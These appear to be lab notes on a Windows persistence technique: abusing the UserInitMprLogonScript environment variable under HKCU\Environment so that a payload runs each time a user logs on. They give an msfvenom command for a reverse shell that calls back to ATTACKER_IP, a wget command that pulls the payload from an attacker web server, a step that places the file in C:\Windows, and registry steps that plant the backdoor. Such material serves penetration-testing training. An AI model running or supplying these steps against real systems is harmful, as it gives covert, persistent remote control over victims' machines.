Logon scripts

One of the things userinit.exe does while loading your user profile is to check for an environment variable called:
    -UserInitMprLogonScript 

We can use this environment variable to assign a logon script to a user that will get run when logging into the machine. 
The variable isn't set by default, so we can just create it and assign any script we like.

Notice that each user has its own environment variables; therefore, you will need to backdoor each separately.

Let's first create a reverse shell to use for this technique:

    -Kali$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe

We'll transfer the shell to our victim machine as we did previously.
    Windows Powershell:
        -wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
        
We can then copy the shell to any directory we like. In this case, we will use C:\Windows:

Windows:
    -C:\> move revshell.exe C:\Windows
To create an environment variable for a user, you can go to its: "HKCU\Environment" in the registry.

We will add the revershell to "UserInitMprLogonScript" entry to point to our payload so it gets loaded when the users logs in:

Computer\HKEY_CURRENT_USER\Environment

Notice that this registry key has no equivalent in HKLM, making your backdoor apply to the current user only.

After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).
